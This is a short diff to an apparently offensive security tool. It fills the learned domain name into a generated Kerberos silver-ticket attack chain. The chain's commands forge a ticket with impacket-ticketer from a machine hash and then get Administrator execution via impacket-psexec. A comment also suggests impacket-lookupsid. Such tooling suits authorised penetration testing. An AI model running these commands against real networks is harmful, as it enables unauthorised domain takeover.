@@ -612,15 +612,18 @@ def run(report, store, ui=None):
             _sid_note_sv = "" if _sid_sv.startswith("S-") else (
                 "   # look up domain SID: impacket-lookupsid "
                 "<DC>/<u>:<p>@<DC>")
+            # iter-55: substitute learned domain into the SPN FQDN so the
+            # silver ticket targets the real service. Falls back to '<dom>'
+            # placeholder when unknown.
             chains.append(Chain("R-SILVER", "silver ticket",
                 f"machine hash {host_short}$ -> silver ticket forgery for {host_short}",
                 crit=9, conf=0.9, ready=1.4, prox=0.9,      # score 10.2
                 commands=[
                     f"impacket-ticketer -nthash {h} -domain-sid {_sid_sv} "
-                    f"-domain {_dom_sv} -spn cifs/{host_short}.<dom> "
+                    f"-domain {_dom_sv} -spn cifs/{host_short}.{_dom_sv} "
                     f"Administrator{_sid_note_sv}",
                     f"export KRB5CCNAME=Administrator.ccache",
-                    f"impacket-psexec -k -no-pass {_dom_sv}/Administrator@{host_short}.<dom>",
+                    f"impacket-psexec -k -no-pass {_dom_sv}/Administrator@{host_short}.{_dom_sv}",
                 ], src=hsrc, line=hln))
             break
 
